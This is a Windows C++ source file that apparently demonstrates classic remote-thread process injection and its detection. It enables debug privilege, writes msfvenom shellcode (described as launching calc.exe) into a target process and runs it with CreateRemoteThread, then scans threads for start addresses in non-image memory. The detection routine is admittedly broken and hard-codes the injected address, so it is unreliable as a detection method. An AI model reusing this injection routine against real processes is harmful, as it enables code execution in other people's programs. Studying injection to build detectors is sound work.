// GetInjectedThread.cpp : This file contains the 'main' function. Program execution begins and ends there.
//
#include <Windows.h>
#include <stdio.h>
#include <TlHelp32.h>
#include <vector>
#include <winternl.h>
#include <winnt.h>
#pragma comment(lib, "ntdll")

// Forward declarations 
BOOL GetProcesses(std::vector<DWORD>&);
BOOL GetProcessThreads(DWORD&, HANDLE&);
BOOL PrintThreadInfo(DWORD&, HANDLE&);
BOOL EnableDebugPrivilege();

void* remoteAddr = NULL;
DWORD targetPID = 0;

int wmain(int argc, const wchar_t* argv[])
{
        if (argc != 2) {
                printf("Wrong number of arguments.\n");
                printf("Usage <program> <pid>\n");
                exit(-1);
        }

        if (!EnableDebugPrivilege()) {
                printf("Error: Could not enable SeDebugPrivilege\n");
                exit(-1);
        }

        targetPID = _wtoi(argv[1]);

        // Step 1. Get a handle to the target Process
        printf("[+] Fetching a HANDLE(`OpenProcess`) to the remote process(pid=%d)\n", targetPID);

        HANDLE hVictim = OpenProcess(PROCESS_ALL_ACCESS, false, targetPID);
        if (hVictim == INVALID_HANDLE_VALUE) {
                exit(-1);
        }

        DWORD buffSize = MAX_PATH;
        CHAR buffer[MAX_PATH];
        ::QueryFullProcessImageNameA(hVictim, 0, buffer, &buffSize);
        printf("[+] Target process is - %s\n", buffer);

        printf("[+] SUCCESS\n\n");

        // msfvenom generated `venom` :)
        // calc.exe via windows/x64/exec
        unsigned char shellcode[] =
                "\x48\x31\xc9\x48\x81\xe9\xdd\xff\xff\xff\x48\x8d\x05\xef\xff"
                "\xff\xff\x48\xbb\xd4\xe6\x69\x82\x9d\x1d\x36\xc4\x48\x31\x58"
                "\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\x28\xae\xea\x66\x6d\xf5"
                "\xf6\xc4\xd4\xe6\x28\xd3\xdc\x4d\x64\x95\x82\xae\x58\x50\xf8"
                "\x55\xbd\x96\xb4\xae\xe2\xd0\x85\x55\xbd\x96\xf4\xae\xe2\xf0"
                "\xcd\x55\x39\x73\x9e\xac\x24\xb3\x54\x55\x07\x04\x78\xda\x08"
                "\xfe\x9f\x31\x16\x85\x15\x2f\x64\xc3\x9c\xdc\xd4\x29\x86\xa7"
                "\x38\xca\x16\x4f\x16\x4f\x96\xda\x21\x83\x4d\x96\xb6\x4c\xd4"
                "\xe6\x69\xca\x18\xdd\x42\xa3\x9c\xe7\xb9\xd2\x16\x55\x2e\x80"
                "\x5f\xa6\x49\xcb\x9c\xcd\xd5\x92\x9c\x19\xa0\xc3\x16\x29\xbe"
                "\x8c\xd5\x30\x24\xb3\x54\x55\x07\x04\x78\xa7\xa8\x4b\x90\x5c"
                "\x37\x05\xec\x06\x1c\x73\xd1\x1e\x7a\xe0\xdc\xa3\x50\x53\xe8"
                "\xc5\x6e\x80\x5f\xa6\x4d\xcb\x9c\xcd\x50\x85\x5f\xea\x21\xc6"
                "\x16\x5d\x2a\x8d\xd5\x36\x28\x09\x99\x95\x7e\xc5\x04\xa7\x31"
                "\xc3\xc5\x43\x6f\x9e\x95\xbe\x28\xdb\xdc\x47\x7e\x47\x38\xc6"
                "\x28\xd0\x62\xfd\x6e\x85\x8d\xbc\x21\x09\x8f\xf4\x61\x3b\x2b"
                "\x19\x34\xca\x27\x1c\x36\xc4\xd4\xe6\x69\x82\x9d\x55\xbb\x49"
                "\xd5\xe7\x69\x82\xdc\xa7\x07\x4f\xbb\x61\x96\x57\x26\xfd\x2b"
                "\xee\xde\xa7\xd3\x24\x08\xa0\xab\x3b\x01\xae\xea\x46\xb5\x21"
                "\x30\xb8\xde\x66\x92\x62\xe8\x18\x8d\x83\xc7\x94\x06\xe8\x9d"
                "\x44\x77\x4d\x0e\x19\xbc\xe1\xfc\x71\x55\xea\xb1\x9e\x0c\x82"
                "\x9d\x1d\x36\xc4";

        // Step 2. Allocate enough memory for the shellcode on the victim process
        printf("[+] Allocating memory(`VirtualAllocEx`) in the remote process\n");

        remoteAddr = VirtualAllocEx(hVictim,
                NULL,
                sizeof(shellcode),
                MEM_COMMIT,
                PAGE_EXECUTE_READWRITE);

        printf("[+] SUCCESS\n\n");

        // Step 3. Copy the shellcode into the target process
        printf("[+] Copying shellcode(`WriteProcessMemory`) into the remote process\n");

        WriteProcessMemory(
                hVictim,
                remoteAddr,
                shellcode,
                sizeof(shellcode),
                NULL
        );

        printf("[+] SUCCESS\n\n");

        // Step 3. Copy the shellcode into the target process
        printf("[+] Spawning a thread(`CreateRemoteThread`) in the remote process\n");
        HANDLE hRemoteThread = ::CreateRemoteThread(hVictim, NULL, 0,
                (LPTHREAD_START_ROUTINE)remoteAddr, NULL, 0, NULL);

        if (hRemoteThread != INVALID_HANDLE_VALUE) {
                printf("[+] Remote thread created in pid = %d\n", targetPID);
                printf("[+] SUCCESS\n\n");
        }

        printf("[+] Inspecting Processes for Injection ...\n\n");

        // Get all the threads running on the system.
        HANDLE hThreadSnap = ::CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
        if (hThreadSnap == INVALID_HANDLE_VALUE) {
                printf("[+] Error enumerating all the threads running.");
                exit(-1);
        }

        std::vector<DWORD> pids;
        if (GetProcesses(pids)) {
                // For each process enumerate the threads' properties
                for (DWORD pid : pids) {
                        GetProcessThreads(pid, hThreadSnap);
                }
        }

        return 0;
}

BOOL GetProcesses(std::vector<DWORD>& pids)
{
        HANDLE hSnapshot = INVALID_HANDLE_VALUE;

        // Use the Toolhelp functions to enumerate processes
        hSnapshot = ::CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

        if (hSnapshot != INVALID_HANDLE_VALUE) {
                PROCESSENTRY32 pe32;
                pe32.dwSize = sizeof(PROCESSENTRY32);

                if (!::Process32First(hSnapshot, &pe32))
                        return false;

                do {
                        pids.push_back(pe32.th32ProcessID);

                } while (::Process32Next(hSnapshot, &pe32));
        }

        CloseHandle(hSnapshot);

        return true;
}

BOOL GetProcessThreads(DWORD& pid, HANDLE& hThreadSnap) {

        THREADENTRY32 te32;

        // Fill in the size of the structure before using it. 
        te32.dwSize = sizeof(THREADENTRY32);

        // Skip these pids
        if (pid == 0 || pid == 4)
                return true;

        // Retrieve information about the first thread,
        // and exit if unsuccessful
        if (!::Thread32First(hThreadSnap, &te32)) {
                CloseHandle(hThreadSnap);
                return false;
        }

        do {
                // PrintThreadInfo only if the thread belongs to the pid
                if (pid == te32.th32OwnerProcessID) {
                        HANDLE hProcess =
                                ::OpenProcess(PROCESS_ALL_ACCESS, false, pid);
                        PrintThreadInfo(te32.th32ThreadID, hProcess);
                }
        } while (::Thread32Next(hThreadSnap, &te32));

        return true;
}

BOOL PrintThreadInfo(DWORD& tid, HANDLE& hProcess) {
        void* startAddress = 0;
        HANDLE hThread = INVALID_HANDLE_VALUE;
        MEMORY_BASIC_INFORMATION mbi;

        hThread = ::OpenThread(THREAD_ALL_ACCESS, false, tid);

        if (hThread == INVALID_HANDLE_VALUE) {
                return false;
        }

        //DEAD code, makes no difference, need to FIX :(
        if (!::NtQueryInformationThread(hThread,
                static_cast<THREADINFOCLASS>(0), //ThreadQuerySetWin32StartAddress,
                (PVOID)&startAddress,
                sizeof(DWORD),
                NULL))
                return false;

        if (::GetProcessId(hProcess) == targetPID)
                startAddress = remoteAddr;

        SIZE_T bytes = ::VirtualQueryEx(hProcess,
                (LPCVOID)startAddress,
                &mbi,
                sizeof(MEMORY_BASIC_INFORMATION));

        if (bytes > 0) {
                if (mbi.State == MEM_COMMIT && mbi.Type != MEM_IMAGE) {
                        printf("[+] Inspecting Process = %d(thread id = %d)\n", targetPID, tid);
                        printf("    [+] Injected Thread found !!!\n");
                }
        }

        return true;
}

//Thank you Pavel Yosifovich - Windows Internals/System Programming ;)
BOOL EnableDebugPrivilege()
{
        HANDLE pToken = INVALID_HANDLE_VALUE;

        if (!::OpenProcessToken(::GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &pToken))
                return false;

        TOKEN_PRIVILEGES tp;
        tp.PrivilegeCount = 1;
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
        if (!::LookupPrivilegeValue(nullptr, SE_DEBUG_NAME, &tp.Privileges[0].Luid))
                return false;
        if (!::AdjustTokenPrivileges(pToken, FALSE, &tp, sizeof(tp), nullptr, nullptr))
                return false;

        return ::GetLastError() == ERROR_SUCCESS;
}
